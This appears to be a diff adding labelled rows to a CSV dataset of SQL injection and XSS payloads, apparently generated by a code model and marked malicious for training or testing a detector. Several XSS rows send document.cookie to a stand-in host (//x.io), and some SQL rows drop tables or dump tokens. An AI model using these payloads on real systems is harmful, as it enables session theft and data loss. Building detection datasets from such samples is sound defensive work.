+"""; SELECT SLEEP(5)%23",1,sqli,codellama
+']+OR+1=1+#,1,sqli,codellama
+""") OR 1 LIKE 1 --",1,sqli,codellama
+`+AND+0<1+#,1,sqli,codellama
+"""	OR	1 BETWEEN 0 AND 9	--",1,sqli,codellama
+'%0d%0aAND%0d%0a2>1%0d%0a/*x*/,1,sqli,codellama
+'); SELECT SLEEP(5)-- -,1,sqli,codellama
+') AND 1 LIKE 1 -- ,1,sqli,codellama
+`%0aOR%0a''=''%0a#,1,sqli,codellama
+"""); DROP TABLE users--",1,sqli,codellama
+'] OR 1=1 LIMIT 1--,1,sqli,codellama
+'] OR 1=1 #,1,sqli,codellama
+` OR 1=1 LIMIT 1-- ,1,sqli,codellama
+""" UNION SELECT token,user FROM staff/*x*/",1,sqli,codellama
+`	AND	1=2	-- -,1,sqli,codellama
+'; SELECT SLEEP(5)-- ,1,sqli,codellama
+']	OR	1 LIKE 1	-- -,1,sqli,codellama
+'%0aOR%0a'a'='a'%0a/*x*/,1,sqli,codellama
+"""%09AND%090<1%09-- -",1,sqli,codellama
+`%0d%0aOR%0d%0a'a'='a'%0d%0a-- -,1,sqli,codellama
+')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,codellama
+`+AND+'a'='a'+-- -,1,sqli,codellama
+'] OR 1=2 -- ,1,sqli,codellama
+"""; DROP TABLE staff--",1,sqli,codellama
+"""><iframe oninput=location='//x.io'>",1,xss,codellama
+"""><svg oninput=alert(document.cookie)>",1,xss,codellama
+"<iframe src=""javascript:confirm(1)"">",1,xss,codellama
+"<script onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><div onerror=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"<body onfocus=""alert(1)"">",1,xss,codellama
+'><input onfocus=alert(1)>,1,xss,codellama
+'><iframe onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<script onload=print()>,1,xss,codellama
+<marquee onstart=alert(document.cookie)>,1,xss,codellama
+<body onpointerover=alert(1)>,1,xss,codellama
+"""><img ontoggle=print()>",1,xss,codellama
+<audio ontoggle=alert(document.cookie)>,1,xss,codellama
+'><img oninput=print()>,1,xss,codellama
+'><audio onclick=confirm(1)>,1,xss,codellama
+"""><script oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><video oninput=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+'><details onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><script oninput=location='//x.io'>",1,xss,codellama
+"""><details onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+<marquee ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+'><object oninput=alert(document.domain)>,1,xss,codellama
+<video onload=confirm(1)>,1,xss,codellama
+"""><script onpointerover=print()>",1,xss,codellama
+"<body onanimationstart=""alert(document.domain)"">",1,xss,codellama
+'><details ontoggle=alert(document.domain)>,1,xss,codellama
+<video ontoggle=alert(1)>,1,xss,codellama
+"<a onpointerover=""alert(document.cookie)"">",1,xss,codellama
+'><div onpointerover=location='//x.io'>,1,xss,codellama
+"<body oninput=""print()"">",1,xss,codellama
+<video onanimationstart=alert(document.domain)>,1,xss,codellama
+<div onmouseover=alert(1)>,1,xss,codellama
+"<div onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><svg onclick=alert(1)>,1,xss,codellama
+"""><body onload=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+'><script oninput=alert(document.domain)>,1,xss,codellama
+"<body ontoggle=""confirm(1)"">",1,xss,codellama
+"<marquee onfocus=""alert(document.domain)"">",1,xss,codellama
+"""><div ontoggle=location='//x.io'>",1,xss,codellama
+"""><img ontoggle=alert(document.cookie)>",1,xss,codellama
+"<marquee onload=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><audio onpointerover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><details onerror=alert(1)>,1,xss,codellama
+<details onerror=alert(document.domain)>,1,xss,codellama
+'><img onanimationstart=print()>,1,xss,codellama
+"""><object onpointerover=location='//x.io'>",1,xss,codellama
+'><img onfocus=print()>,1,xss,codellama
+"""><video onanimationstart=print()>",1,xss,codellama
+<video ontoggle=confirm(1)>,1,xss,codellama
+"<audio ontoggle=""alert(1)"">",1,xss,codellama
+"""><input onfocus=print()>",1,xss,codellama
+"<marquee onanimationstart=""alert(document.domain)"">",1,xss,codellama
+"<audio onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<script onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><video onpointerover=alert(document.cookie)>",1,xss,codellama
+'><svg onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><iframe onerror=alert(document.domain)>,1,xss,codellama
+"<a onerror=""confirm(1)"">",1,xss,codellama
+<img onanimationstart=print()>,1,xss,codellama
+'><details onclick=print()>,1,xss,codellama
+<iframe onload=alert(document.cookie)>,1,xss,codellama
+"<video onstart=""location='//x.io'"">",1,xss,codellama
+"""><details onpointerover=alert(document.cookie)>",1,xss,codellama
+<body onstart=location='//x.io'>,1,xss,codellama
+<img onclick=alert(document.domain)>,1,xss,codellama
+"""><audio onfocus=alert(1)>",1,xss,codellama
+"<iframe oninput=""print()"">",1,xss,codellama
+<iframe onanimationstart=print()>,1,xss,codellama
+<object ontoggle=print()>,1,xss,codellama
+'><svg onerror=alert(1)>,1,xss,codellama
+"<script onclick=""alert(document.cookie)"">",1,xss,codellama
+"<video onanimationstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><svg onanimationstart=alert(1)>,1,xss,codellama
+<input onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><a onstart=alert(document.cookie)>",1,xss,codellama
+<svg onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<script onclick=confirm(1)>,1,xss,codellama
+'><details onmouseover=alert(1)>,1,xss,codellama
+"<div onstart=""alert(document.cookie)"">",1,xss,codellama
+"""><div onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+'><details onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><input onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"<a href=""javascript:alert(document.domain)"">x</a>",1,xss,codellama
+"<script onload=""confirm(1)"">",1,xss,codellama
+"<input onmouseover=""confirm(1)"">",1,xss,codellama
+"<script onclick=""alert(1)"">",1,xss,codellama
+<img onclick=alert(document.cookie)>,1,xss,codellama
+"<div onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+<script onload=alert(document.cookie)>,1,xss,codellama
+<div onmouseover=alert(document.cookie)>,1,xss,codellama
+<marquee ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><script oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<input onclick=alert(document.cookie)>,1,xss,codellama
+<body ontoggle=confirm(1)>,1,xss,codellama
+<marquee onload=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<input onstart=confirm(1)>,1,xss,codellama
+'><svg onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"<iframe onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"""><marquee ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"<audio onerror=""alert(document.domain)"">",1,xss,codellama
+"""><object onload=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+'><audio onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<a onstart=""alert(document.cookie)"">",1,xss,codellama
+<object onstart=alert(1)>,1,xss,codellama
+<svg onfocus=print()>,1,xss,codellama
+'><body onerror=confirm(1)>,1,xss,codellama
+"""><div onfocus=alert(document.domain)>",1,xss,codellama
+'><script onclick=alert(document.domain)>,1,xss,codellama
+<details onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<script onstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+<img onfocus=alert(document.cookie)>,1,xss,codellama
+'><script onpointerover=location='//x.io'>,1,xss,codellama
+"""><script ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><marquee onerror=confirm(1)>",1,xss,codellama
+<svg onerror=confirm(1)>,1,xss,codellama
+'><img onanimationstart=confirm(1)>,1,xss,codellama
+"""><input onclick=confirm(1)>",1,xss,codellama
+<body onclick=location='//x.io'>,1,xss,codellama
+'><svg onclick=alert(document.domain)>,1,xss,codellama
+<iframe onpointerover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<svg onclick=alert(document.cookie)>,1,xss,codellama
+"<object oninput=""print()"">",1,xss,codellama
+"<video onfocus=""alert(document.domain)"">",1,xss,codellama
+"<body onfocus=""alert(document.cookie)"">",1,xss,codellama
+"<input onstart=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"""><marquee onstart=print()>",1,xss,codellama
+'><img onerror=location='//x.io'>,1,xss,codellama
+<div onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><script oninput=alert(document.domain)>",1,xss,codellama
+'><audio onfocus=alert(document.domain)>,1,xss,codellama
+'><audio onfocus=alert(1)>,1,xss,codellama
+"<body onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<marquee ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"""><div onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"<img onmouseover=""alert(document.cookie)"">",1,xss,codellama
+"""><body onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"""><marquee onload=print()>",1,xss,codellama
+"<script onpointerover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><img onanimationstart=alert(document.domain)>,1,xss,codellama
+"<script onpointerover=""alert(document.cookie)"">",1,xss,codellama
+<a oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"<iframe src=""javascript:print()"">",1,xss,codellama
+'><marquee ontoggle=alert(document.cookie)>,1,xss,codellama
+"""><img onstart=location='//x.io'>",1,xss,codellama
+'><marquee oninput=print()>,1,xss,codellama
+"<audio oninput=""confirm(1)"">",1,xss,codellama
+'><a onpointerover=alert(document.cookie)>,1,xss,codellama
+'><input onpointerover=location='//x.io'>,1,xss,codellama
+'><video ontoggle=location='//x.io'>,1,xss,codellama
+'><body ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<a onpointerover=alert(1)>,1,xss,codellama
+"<div oninput=""print()"">",1,xss,codellama
+<a onclick=location='//x.io'>,1,xss,codellama
+<a onclick=confirm(1)>,1,xss,codellama
+"""><body onmouseover=location='//x.io'>",1,xss,codellama
+"<script onstart=""location='//x.io'"">",1,xss,codellama
+"<script ontoggle=""location='//x.io'"">",1,xss,codellama
+"""><a oninput=alert(document.domain)>",1,xss,codellama
+"""><input onstart=print()>",1,xss,codellama
+"<object onmouseover=""location='//x.io'"">",1,xss,codellama
+"""><audio onload=alert(document.domain)>",1,xss,codellama
+"<audio onpointerover=""confirm(1)"">",1,xss,codellama
+'><div onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<marquee onanimationstart=""location='//x.io'"">",1,xss,codellama
+"<a onclick=""confirm(1)"">",1,xss,codellama
+"""><script onclick=alert(document.cookie)>",1,xss,codellama
+<script onerror=alert(document.cookie)>,1,xss,codellama
+<script oninput=alert(document.domain)>,1,xss,codellama
+<img onstart=alert(1)>,1,xss,codellama
+"<marquee onload=""confirm(1)"">",1,xss,codellama
+'><script onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><input onmouseover=alert(document.domain)>,1,xss,codellama
+'><img onfocus=alert(document.cookie)>,1,xss,codellama
+<details onpointerover=print()>,1,xss,codellama
+<marquee onerror=confirm(1)>,1,xss,codellama
+"""><object onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><object ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<details onfocus=print()>,1,xss,codellama
+<div onstart=print()>,1,xss,codellama
+<marquee onstart=alert(1)>,1,xss,codellama
+"<iframe ontoggle=""location='//x.io'"">",1,xss,codellama
+<input onpointerover=alert(1)>,1,xss,codellama
+<details oninput=print()>,1,xss,codellama
+"""><object onmouseover=print()>",1,xss,codellama
+<details ontoggle=alert(document.domain)>,1,xss,codellama
+"<body onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><input onpointerover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<audio onload=alert(1)>,1,xss,codellama
+"""><div onfocus=confirm(1)>",1,xss,codellama
+"<input oninput=""alert(document.domain)"">",1,xss,codellama
+"""><img onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+<input oninput=confirm(1)>,1,xss,codellama
+<body onfocus=alert(1)>,1,xss,codellama
+"<img onpointerover=""alert(document.cookie)"">",1,xss,codellama
+<script onload=alert(document.domain)>,1,xss,codellama
+"<marquee ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+'><iframe onfocus=print()>,1,xss,codellama
+<object oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<details oninput=alert(document.domain)>,1,xss,codellama
+'><input onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<input oninput=print()>,1,xss,codellama
+"<details onmouseover=""confirm(1)"">",1,xss,codellama
+'><script ontoggle=confirm(1)>,1,xss,codellama
+<script onstart=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><img onpointerover=alert(document.cookie)>",1,xss,codellama
+"<details onload=""alert(document.domain)"">",1,xss,codellama
+<input onpointerover=alert(document.cookie)>,1,xss,codellama
+<details oninput=confirm(1)>,1,xss,codellama
+"<marquee onstart=""confirm(1)"">",1,xss,codellama
+'><video ontoggle=alert(document.domain)>,1,xss,codellama
+'><video onerror=confirm(1)>,1,xss,codellama
+"<object onclick=""location='//x.io'"">",1,xss,codellama
+"<img onclick=""print()"">",1,xss,codellama
+"<audio oninput=""print()"">",1,xss,codellama
+"<img ontoggle=""alert(1)"">",1,xss,codellama
+"<marquee onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><a ontoggle=print()>",1,xss,codellama
+<svg ontoggle=print()>,1,xss,codellama
+"<marquee onclick=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<body ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<object onload=""alert(document.cookie)"">",1,xss,codellama
+'><img onstart=alert(document.domain)>,1,xss,codellama
+"<div oninput=""location='//x.io'"">",1,xss,codellama
+'><iframe onstart=location='//x.io'>,1,xss,codellama
+'><marquee onmouseover=confirm(1)>,1,xss,codellama
+<script oninput=alert(document.cookie)>,1,xss,codellama
+"""><marquee onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"""><marquee onclick=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+<script ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+'><svg onpointerover=alert(document.cookie)>,1,xss,codellama
+<object onpointerover=alert(document.cookie)>,1,xss,codellama
+'><iframe oninput=location='//x.io'>,1,xss,codellama
+'><video onstart=confirm(1)>,1,xss,codellama
+'><a onclick=confirm(1)>,1,xss,codellama
+'><audio onmouseover=alert(document.domain)>,1,xss,codellama
+"<details ontoggle=""alert(1)"">",1,xss,codellama
+"<audio onstart=""alert(document.domain)"">",1,xss,codellama
+"<script onfocus=""location='//x.io'"">",1,xss,codellama
+<marquee onmouseover=alert(document.domain)>,1,xss,codellama
+"<video ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><details onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<video onpointerover=""alert(document.domain)"">",1,xss,codellama
+<input onclick=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><div onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+<img oninput=confirm(1)>,1,xss,codellama
+"""><input onfocus=alert(document.domain)>",1,xss,codellama
+"""><marquee onfocus=alert(document.domain)>",1,xss,codellama
+<object onpointerover=location='//x.io'>,1,xss,codellama
+"""><audio onstart=alert(document.cookie)>",1,xss,codellama
+"<iframe onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"""><video onerror=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"""><video ontoggle=alert(document.domain)>",1,xss,codellama
+"""><iframe onload=print()>",1,xss,codellama
+"<a onerror=""alert(document.domain)"">",1,xss,codellama
+'><iframe onmouseover=alert(1)>,1,xss,codellama
+<a onclick=alert(1)>,1,xss,codellama
+'><input onerror=alert(document.cookie)>,1,xss,codellama
+"<img onpointerover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"<iframe src=""java	script:fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><video onmouseover=print()>",1,xss,codellama
+<audio ontoggle=location='//x.io'>,1,xss,codellama
+'><audio ontoggle=alert(document.domain)>,1,xss,codellama
+"""><svg onanimationstart=confirm(1)>",1,xss,codellama
+"""><script onmouseover=print()>",1,xss,codellama
+"""><object ontoggle=alert(document.cookie)>",1,xss,codellama
+'><details oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"<body onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+<video onpointerover=alert(1)>,1,xss,codellama
+'><svg onclick=location='//x.io'>,1,xss,codellama
+"""><div onmouseover=print()>",1,xss,codellama
+<object oninput=print()>,1,xss,codellama
+"""><div ontoggle=confirm(1)>",1,xss,codellama
+'><details oninput=alert(document.cookie)>,1,xss,codellama
+"""><iframe onerror=print()>",1,xss,codellama
+"""><svg onload=alert(1)>",1,xss,codellama
+"""><img onpointerover=alert(1)>",1,xss,codellama
+"""><object ontoggle=location='//x.io'>",1,xss,codellama
+<iframe onclick=confirm(1)>,1,xss,codellama
+"<video onmouseover=""alert(document.domain)"">",1,xss,codellama
+"<a onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+<details onclick=confirm(1)>,1,xss,codellama
+"<iframe src=""javascript:alert(document.domain)"">",1,xss,codellama
+"""><marquee onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><img onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><svg onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+'><object onclick=confirm(1)>,1,xss,codellama
+'><details onerror=alert(document.domain)>,1,xss,codellama
+"""><a ontoggle=location='//x.io'>",1,xss,codellama
+"<div onstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><iframe onpointerover=alert(1)>",1,xss,codellama
+"""><script onmouseover=alert(1)>",1,xss,codellama
+<script>confirm(1)</script>,1,xss,codellama
+<details onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<object oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><img onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+'><marquee onerror=alert(1)>,1,xss,codellama
+<svg onstart=print()>,1,xss,codellama
+"""><audio onpointerover=confirm(1)>",1,xss,codellama
+"""><video onstart=alert(document.cookie)>",1,xss,codellama
+<a onerror=alert(1)>,1,xss,codellama
+"<iframe onfocus=""alert(document.cookie)"">",1,xss,codellama
+'><details onerror=confirm(1)>,1,xss,codellama
+"<svg oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+<img onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<audio onmouseover=alert(1)>,1,xss,codellama
+"""><iframe onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+<input onstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><a onerror=alert(1)>,1,xss,codellama
+'><input onfocus=confirm(1)>,1,xss,codellama
+"""><input ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+<iframe ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><img onload=confirm(1)>,1,xss,codellama
+'><input onstart=alert(1)>,1,xss,codellama
+"<video onfocus=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<svg ontoggle=""alert(document.domain)"">",1,xss,codellama
+<audio onload=confirm(1)>,1,xss,codellama
+"""><video onpointerover=location='//x.io'>",1,xss,codellama
+"<object onclick=""alert(document.domain)"">",1,xss,codellama
+"""><marquee onanimationstart=confirm(1)>",1,xss,codellama
+"""><a onpointerover=alert(document.cookie)>",1,xss,codellama
+'><marquee onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"<body onclick=""confirm(1)"">",1,xss,codellama
+"""><video onload=alert(document.domain)>",1,xss,codellama
+"""><input oninput=alert(document.cookie)>",1,xss,codellama
+<input onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><marquee onstart=alert(document.cookie)>,1,xss,codellama
+<div ontoggle=alert(document.cookie)>,1,xss,codellama
+"""><body onfocus=alert(document.domain)>",1,xss,codellama
+'><img onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><audio oninput=print()>,1,xss,codellama
+<object onload=alert(document.domain)>,1,xss,codellama
+"<a onpointerover=""confirm(1)"">",1,xss,codellama
+"""><img onload=print()>",1,xss,codellama
+'><audio onanimationstart=print()>,1,xss,codellama
+'><a onfocus=confirm(1)>,1,xss,codellama
+'><audio onload=location='//x.io'>,1,xss,codellama
+<svg onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"<script onerror=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"""><a onpointerover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><body ontoggle=location='//x.io'>",1,xss,codellama
+<audio oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<marquee ontoggle=alert(1)>,1,xss,codellama
+<object oninput=confirm(1)>,1,xss,codellama
+'><svg onfocus=location='//x.io'>,1,xss,codellama
+"""><a onfocus=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+<script onanimationstart=print()>,1,xss,codellama
+'><details oninput=alert(1)>,1,xss,codellama
+"<details onfocus=""location='//x.io'"">",1,xss,codellama
+"""><a ontoggle=confirm(1)>",1,xss,codellama
+'><details onstart=confirm(1)>,1,xss,codellama
+"<a onpointerover=""print()"">",1,xss,codellama
+'><iframe oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><object onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><input onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<svg onfocus=alert(1)>,1,xss,codellama
+"<object onload=""confirm(1)"">",1,xss,codellama
+<object onload=alert(document.cookie)>,1,xss,codellama
+<a onload=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><input onanimationstart=alert(document.domain)>",1,xss,codellama
+<video ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><a onfocus=location='//x.io'>",1,xss,codellama
+'><script ontoggle=location='//x.io'>,1,xss,codellama
+"<input oninput=""location='//x.io'"">",1,xss,codellama
+'><div onclick=confirm(1)>,1,xss,codellama
+'><marquee ontoggle=confirm(1)>,1,xss,codellama
+"<body onanimationstart=""print()"">",1,xss,codellama
+"<img onstart=""alert(document.cookie)"">",1,xss,codellama
+"""><script onstart=alert(document.domain)>",1,xss,codellama
+<video onanimationstart=alert(1)>,1,xss,codellama
+"""><div onerror=alert(document.cookie)>",1,xss,codellama
+"""><img oninput=location='//x.io'>",1,xss,codellama
+<iframe oninput=location='//x.io'>,1,xss,codellama
+"""><svg ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"<details onstart=""location='//x.io'"">",1,xss,codellama
+<marquee ontoggle=alert(document.cookie)>,1,xss,codellama
+"<body onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+'><details onclick=alert(1)>,1,xss,codellama
+<video onload=location='//x.io'>,1,xss,codellama
+"""><details onerror=confirm(1)>",1,xss,codellama
+"""><marquee onfocus=confirm(1)>",1,xss,codellama
+"<a ontoggle=""confirm(1)"">",1,xss,codellama
+'><body oninput=alert(1)>,1,xss,codellama
+"<marquee onload=""location='//x.io'"">",1,xss,codellama
+"<script onmouseover=""print()"">",1,xss,codellama
+"""><svg onmouseover=alert(document.domain)>",1,xss,codellama
+<a onclick=alert(document.domain)>,1,xss,codellama
+"""><a onclick=confirm(1)>",1,xss,codellama
+'><marquee onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+'><iframe ontoggle=alert(document.cookie)>,1,xss,codellama
+'><body onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<a onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<marquee onfocus=""alert(document.cookie)"">",1,xss,codellama
+"<input oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"<a oninput=""alert(1)"">",1,xss,codellama
+"""><img onclick=location='//x.io'>",1,xss,codellama
+"<svg onfocus=""alert(1)"">",1,xss,codellama
+"""><img oninput=alert(document.domain)>",1,xss,codellama
+"<iframe onmouseover=""alert(document.cookie)"">",1,xss,codellama
+'><div onanimationstart=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+'><script onclick=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<input onstart=""alert(document.cookie)"">",1,xss,codellama
+"""><a onload=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><div onload=alert(document.domain)>,1,xss,codellama
+<marquee onfocus=alert(document.domain)>,1,xss,codellama
+<input onerror=alert(1)>,1,xss,codellama
+<body onanimationstart=location='//x.io'>,1,xss,codellama
+'><object onerror=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><div onstart=alert(document.cookie)>",1,xss,codellama
+"""><svg onpointerover=location='//x.io'>",1,xss,codellama
+'><img onpointerover=alert(1)>,1,xss,codellama
+<img onclick=print()>,1,xss,codellama
+'><marquee onpointerover=location='//x.io'>,1,xss,codellama
+"""><marquee ontoggle=alert(document.cookie)>",1,xss,codellama
+"""><video ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+<audio onstart=print()>,1,xss,codellama
+<audio onstart=location='//x.io'>,1,xss,codellama
+"<iframe src=""JaVaScRiPt:alert(document.cookie)"">",1,xss,codellama
+<div onclick=alert(document.cookie)>,1,xss,codellama
+"""><audio onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><div onclick=alert(1)>",1,xss,codellama
+'><details ontoggle=location='//x.io'>,1,xss,codellama
+<a onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"<svg ontoggle=""location='//x.io'"">",1,xss,codellama
+<object onanimationstart=alert(1)>,1,xss,codellama
+"<marquee onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><div onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><body onpointerover=alert(document.domain)>,1,xss,codellama
+'><img onclick=alert(1)>,1,xss,codellama
+"""><img onpointerover=print()>",1,xss,codellama
+<object onerror=print()>,1,xss,codellama
+'><video onload=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+"""><body onpointerover=confirm(1)>",1,xss,codellama
+"""><object onanimationstart=alert(document.cookie)>",1,xss,codellama
+"""><div onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+"<a oninput=""alert(document.domain)"">",1,xss,codellama
+"<script onstart=""print()"">",1,xss,codellama
+'><input onclick=location='//x.io'>,1,xss,codellama
+"""><a onstart=alert(document.domain)>",1,xss,codellama
+"<object onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><a onpointerover=location='//x.io'>",1,xss,codellama
+"""><iframe onmouseover=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><input onerror=print()>,1,xss,codellama
+"""><body oninput=alert(document.domain)>",1,xss,codellama
+"<a href=""javascript:print()"">x</a>",1,xss,codellama
+"<audio onfocus=""alert(1)"">",1,xss,codellama
+"""><script onmouseover=location='//x.io'>",1,xss,codellama
+<details onerror=alert(1)>,1,xss,codellama
+<body ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<img ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><a onerror=confirm(1)>",1,xss,codellama
+<script onmouseover=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+"""><div ontoggle=alert(document.cookie)>",1,xss,codellama
+"""><svg onfocus=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><div onstart=print()>,1,xss,codellama
+"""><a onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"""><body oninput=alert(1)>",1,xss,codellama
+"<body ontoggle=""location='//x.io'"">",1,xss,codellama
+'><a oninput=print()>,1,xss,codellama
+'><video ontoggle=alert(document.cookie)>,1,xss,codellama
+"<input ontoggle=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"<div onpointerover=""print()"">",1,xss,codellama
+"""><script onmouseover=alert(document.domain)>",1,xss,codellama
+<img onfocus=alert(document.domain)>,1,xss,codellama
+"""><a onclick=location='//x.io'>",1,xss,codellama
+"""><svg onstart=fetch('//x.io/'+document.cookie)>",1,xss,codellama
+'><object onfocus=alert(document.cookie)>,1,xss,codellama
+'><marquee onmouseover=alert(document.cookie)>,1,xss,codellama
+"<body onfocus=""print()"">",1,xss,codellama
+"<audio ontoggle=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+"<video onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+'><details onanimationstart=alert(document.cookie)>,1,xss,codellama
+"""><object ontoggle=fetch('//x.io/'+document.cookie)>",1,xss,codellama
